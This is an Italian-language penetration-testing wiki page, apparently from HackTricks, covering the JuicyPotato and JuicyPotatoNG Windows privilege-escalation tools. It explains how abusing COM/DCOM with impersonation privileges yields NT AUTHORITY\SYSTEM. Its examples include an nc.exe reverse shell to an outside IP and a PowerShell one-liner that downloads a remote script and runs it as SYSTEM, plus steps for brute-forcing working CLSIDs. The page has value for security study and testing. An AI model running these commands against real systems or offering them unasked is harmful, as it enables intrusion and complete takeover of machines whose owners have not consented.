# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato è legacy. In genere funziona sulle versioni di Windows fino a Windows 10 1803 / Windows Server 2016. Le modifiche introdotte da Microsoft a partire da Windows 10 1809 / Server 2019 hanno compromesso la tecnica originale. Per queste build e per quelle più recenti, considera alternative moderne come PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato e altre. Consulta la pagina seguente per opzioni e modalità d'uso aggiornate.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abuso dei privilegi elevati) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Una versione migliorata di_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un po' di succo, cioè **un altro tool di Local Privilege Escalation, dagli account dei servizi Windows a NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### Puoi scaricare juicypotato da [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Note rapide sulla compatibilità

- Funziona in modo affidabile fino a Windows 10 1803 e Windows Server 2016 quando il contesto corrente dispone di SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege.
- È stato reso inutilizzabile dagli hardening di Microsoft in Windows 10 1809 / Windows Server 2019 e versioni successive. Per queste build, preferisci le alternative collegate sopra.

### Riepilogo <a href="#summary" id="summary"></a>

[**Dal Readme di juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) e le sue [varianti](https://github.com/decoder-it/lonelypotato) sfruttano la catena di privilege escalation basata sul [servizio](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>), con il listener MiTM su `127.0.0.1:6666`, quando disponi dei privilegi `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisione di una build di Windows abbiamo trovato una configurazione in cui `BITS` era stato intenzionalmente disabilitato e la porta `6666` era occupata.

Abbiamo deciso di weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **dai il benvenuto a Juicy Potato**.

> Per la teoria, consulta [Rotten Potato - Privilege Escalation dagli account dei servizi a SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) e segui la catena di link e riferimenti.<sup>[[4]](#references)</sup>

Oltre a `BITS`, è possibile abusare di diversi server COM. Devono soltanto:

1. poter essere istanziati dall'utente corrente, normalmente un “service user” che dispone dei privilegi di impersonation
2. implementare l'interfaccia `IMarshal`
3. essere eseguiti da un utente con privilegi elevati (SYSTEM, Administrator, …)

Dopo alcuni test abbiamo ottenuto e verificato un ampio elenco di [CLSID interessanti](http://ohpe.it/juicy-potato/CLSID/) su diverse versioni di Windows.

### Dettagli di Juicy <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato consente di:<sup>[[1]](#references)</sup>

- **CLSID target** _scegli qualsiasi CLSID desideri._ [_Qui_](http://ohpe.it/juicy-potato/CLSID/) _puoi trovare l'elenco organizzato per sistema operativo._
- **Porta di ascolto COM** _definisci la porta di ascolto COM che preferisci (invece della porta 6666 hardcoded nel marshalled)_
- **Indirizzo IP di ascolto COM** _associa il server a qualsiasi IP_
- **Modalità di creazione del processo** _a seconda dei privilegi dell'utente impersonato puoi scegliere tra:_
- `CreateProcessWithToken` (richiede `SeImpersonate`)
- `CreateProcessAsUser` (richiede `SeAssignPrimaryToken`)
- `entrambe`
- **Processo da avviare** _avvia un eseguibile o uno script se l'exploitation ha esito positivo_
- **Argomenti del processo** _personalizza gli argomenti del processo avviato_
- **Indirizzo del server RPC** _per un approccio stealth puoi autenticarti a un server RPC esterno_
- **Porta del server RPC** _utile se vuoi autenticarti a un server esterno e il firewall blocca la porta `135`…_
- **Modalità TEST** _principalmente a scopo di test, ad esempio per testare i CLSID. Crea il DCOM e stampa l'utente del token. Vedi_ [_qui per i test_](http://ohpe.it/juicy-potato/Test/)

### Utilizzo <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Considerazioni finali <a href="#final-thoughts" id="final-thoughts"></a>

[**Dal Readme di juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Se l'utente dispone dei privilegi `SeImpersonate` o `SeAssignPrimaryToken`, allora sei **SYSTEM**.

È quasi impossibile impedire l'abuso di tutti questi COM Servers. Potresti pensare di modificare i permessi di questi oggetti tramite `DCOMCNFG`, ma buona fortuna: sarà difficile.

La soluzione effettiva consiste nel proteggere gli account e le applicazioni sensibili eseguiti con gli account `* SERVICE`. Arrestare `DCOM` impedirebbe certamente questo exploit, ma potrebbe avere un impatto significativo sul sistema operativo sottostante.

Da: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG reintroduce una local privilege escalation in stile JuicyPotato sulle versioni moderne di Windows combinando:<sup>[[2]](#references)</sup>
- La risoluzione DCOM OXID verso un server RPC locale su una porta scelta, evitando il vecchio listener hardcoded 127.0.0.1:6666.
- Un SSPI hook per acquisire e impersonare l'autenticazione SYSTEM in ingresso senza richiedere RpcImpersonateClient, consentendo inoltre CreateProcessAsUser quando è presente solo SeAssignPrimaryTokenPrivilege.
- Tecniche per soddisfare i vincoli di attivazione DCOM (ad esempio, il precedente requisito del gruppo INTERACTIVE quando si utilizza come target la classe PrintNotify / ActiveX Installer Service).

Note importanti (comportamento in evoluzione tra le diverse build):<sup>[[2]](#references)</sup>
- Settembre 2022: la tecnica iniziale funzionava sui target Windows 10/11 e Server supportati utilizzando l'“INTERACTIVE trick”.
- Aggiornamento degli autori di gennaio 2023: in seguito Microsoft ha bloccato l'INTERACTIVE trick. Un CLSID diverso ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) ripristina l'exploitation, ma secondo il loro post solo su Windows 11 / Server 2022.

Utilizzo di base (ulteriori flag nell'help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Se stai prendendo di mira Windows 10 1809 / Server 2019, dove il JuicyPotato classico è stato patchato, preferisci le alternative collegate in alto (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, ecc.). NG potrebbe essere applicabile solo in determinate situazioni, a seconda della build e dello stato del servizio.

## Esempi

Nota: visita [questa pagina](https://ohpe.it/juicy-potato/CLSID/) per un elenco di CLSID da provare.

### Ottenere una reverse shell nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Avviare un nuovo CMD (se hai accesso RDP)

![Powershell rev - Avviare un nuovo CMD (se hai accesso RDP): Avviare un nuovo CMD (se hai accesso RDP)](<../../images/image (300).png>)

## Problemi CLSID

Spesso il CLSID predefinito utilizzato da JuicyPotato **non funziona** e l'exploit fallisce. Di solito, sono necessari diversi tentativi per trovare un **CLSID funzionante**. Per ottenere un elenco di CLSID da provare per uno specifico sistema operativo, visita questa pagina:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Verifica dei CLSID**

Per prima cosa, avrai bisogno di alcuni eseguibili oltre a juicypotato.exe.

Scarica [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e caricalo nella tua sessione PS, quindi scarica ed esegui [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Questo script creerà un elenco di possibili CLSID da testare.

Quindi scarica [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(modifica il percorso dell'elenco dei CLSID e quello dell'eseguibile juicypotato) ed eseguilo. Inizierà a provare ogni CLSID e, **quando il numero della porta cambia, significherà che il CLSID ha funzionato**.

**Verifica** i CLSID funzionanti **utilizzando il parametro -c**

## References

- [1] [README di Juicy Potato (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Una seconda possibilità per JuicyPotato: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Pagina del progetto Juicy Potato (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Escalation dei privilegi dagli account di servizio a SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
